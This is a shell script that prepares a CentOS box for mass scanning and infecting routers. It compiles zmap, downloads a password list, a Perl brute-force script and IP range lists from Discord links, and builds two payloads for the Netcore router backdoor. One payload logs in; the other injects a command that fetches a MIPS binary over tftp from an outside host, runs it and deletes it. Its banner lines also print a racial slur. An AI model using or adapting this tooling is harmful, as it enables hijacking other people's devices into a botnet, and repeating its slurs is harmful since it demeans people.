#!/bin/sh
# CentOS
echo -e "\e[1;32mSETTING UP YOUR SCANNING SHIT NIGGER"

yum update -y
yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
yum install epel-release -y
yum install gengetopt -y
yum install gcc cpan php-pear php-devel libssh2 libssh2-devel -y
pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo 
extension=ssh2.so>/etc/php.d/ssh2.ini 
cpan -fi Net::SSH2
cpan -fi Parallel::ForkManager

wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
wget https://cdn.discordapp.com/attachments/335729551873277954/605359460109647882/pass_file
wget https://cdn.discordapp.com/attachments/616599642733543426/616599695011217409/Tragic.pl
wget https://cdn.discordapp.com/attachments/335729551873277954/605359436478939156/update
wget https://cdn.discordapp.com/attachments/335729551873277954/605523002674642948/canada.lst
wget https://cdn.discordapp.com/attachments/335729551873277954/605522616064802844/57.lst
tar -xvf v2.1.0.tar.gz
cd zmap-2.1.0
flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
byacc -d -o "src/parser.c" "src/parser.y"
mkdir /etc/zmap
cp conf/* /etc/zmap
cmake -DENABLE_HARDENING=ON
make
make install

python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'" > commandpayload

chmod 777 *

echo -e "\e[1;36mYOUR SCANNING SHIT SETUP IS DONE U NIGGER"